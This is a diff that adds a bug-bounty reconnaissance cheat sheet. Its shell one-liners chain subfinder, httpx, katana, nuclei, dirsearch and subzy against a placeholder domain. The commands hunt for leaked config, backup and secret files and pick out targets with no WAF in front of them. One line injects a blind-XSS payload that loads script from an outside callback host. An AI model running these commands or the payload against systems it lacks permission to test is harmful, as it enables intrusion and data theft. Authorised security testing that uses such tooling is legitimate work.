@@ -1,0 +1,56 @@
+subfinder -d domain.com -all -recursive > subdomain.txt
+
+
+cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
+
+
+katana -u subdomains_alive.txt -d 5 waybackarchieve,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif >> allurls.txt
+
+
+cat allurls.txt | grep -E "\.txt|.log|.cache|.secret|.db|.backup|.yml|.json|.gz|.rar|.zip|.config"
+
+
+cat allurls.txt | grep -E "\.js$" >> js.txt
+
+
+cat js.txt | nuclei -t /home/kali/.local/nuclei-templates/http/exposures/
+
+
+echo www.domain.com | katana -ps | grep -E "\.js$" | nuclei -t /home/kali/.local/nuclei-templates/http/exposures/ -c 30
+
+
+sudo dirsearch -u https://domain.com -e conf,config,bak,backup,swp,old,db,sql/asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bkp,cache,cgi,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,sql.gz,http://sql.zip,sql.tar.gz,sql~,,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+
+
+subfinder -d domain.com | httpx-toolkit -silent | katana -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/hyper></script>' -parameters
+
+
+sudo subzy run --targets subdomains_alive.txt --concurrency 100 --hide_fails
+
+
+
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+
+
+subfinder -d domain.com -all -recursive > subdomain.txt
+
+cat subdomain.txt | httpx-toolkit -td -title -sc -ip >> httpx_subs.txt
+
+cat httpx_subs.txt | awk '{print $1}' >> live_subs_target.txt
+
+#(Let it run in background)
+nuclei -l live_subs_target.txt -rl 10 -bs 2 -c 2 -as -silent -s critical,high,medium,low 
+
+#waf check
+
+#no waf filtering
+cat httpx_subs.txt | grep -v -i -E 'cloudfare|imperva|cloudfront' >> nowafsubs.txt
+
+cat nowafsubs.txt | grep 403 | awk '{print $1}' >> 403subs.txt
+
+cat httpx_subs.txt | grep 403 
+
+sudo dirsearch -u https://found_target_from_403subs.txt.com -x 301,403,404,500,400,502,503,302,429 --random-agent
+
+sudo dirsearch -u https://found_target_from_403subs.txt.com -e xml,json,sql,db,log,yml,yaml,bak,txt,tar,zip,gz
